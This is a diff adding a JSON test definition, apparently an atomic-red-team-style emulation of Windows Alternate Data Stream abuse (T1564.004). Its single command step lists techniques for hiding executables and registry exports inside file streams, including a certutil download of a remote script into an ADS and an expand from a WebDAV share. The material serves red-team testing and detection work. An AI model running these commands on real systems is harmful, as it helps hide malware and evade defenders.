@@ -1,0 +1,31 @@
+{
+  "id": "8822c3b0-d9f9-4daf-a043-49f4602364f4",
+  "name": "Alternate Data Streams (ADS)",
+  "description": "Execute from Alternate Streams\n\n[Reference - 1](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)\n\n[Reference - 2](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "e8c2dd88-6106-417e-bb66-4dc4b11abc08",
+      "type": "execute-command",
+      "data": {
+        "command": "type C:\\temp\\evil.exe \u003e \"C:\\Program Files (x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe\"\nextrac32 #{path}\\procexp.cab #{path}\\file.txt:procexp.exe\nfindstr /V /L W3AllLov3DonaldTrump #{path}\\procexp.exe \u003e #{path}\\file.txt:procexp.exe\ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\\temp:ttt\nmakecab #{path}\\autoruns.exe #{path}\\cabtest.txt:autoruns.cab\nprint /D:#{path}\\file.txt:autoruns.exe #{path}\\Autoruns.exe\nreg export HKLM\\SOFTWARE\\Microsoft\\Evilreg #{path}\\file.txt:evilreg.reg\nregedit /E #{path}\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey\nexpand \\\\webdav\\folder\\file.bat #{path}\\file.txt:file.bat\nesentutl.exe /y #{path}\\autoruns.exe /d #{path}\\file.txt:autoruns.exe /o \n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1564.004",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "path",
+      "type": "path",
+      "description": "Path of ADS file",
+      "value": "c:\\ADS\\"
+    }
+  ]
+}
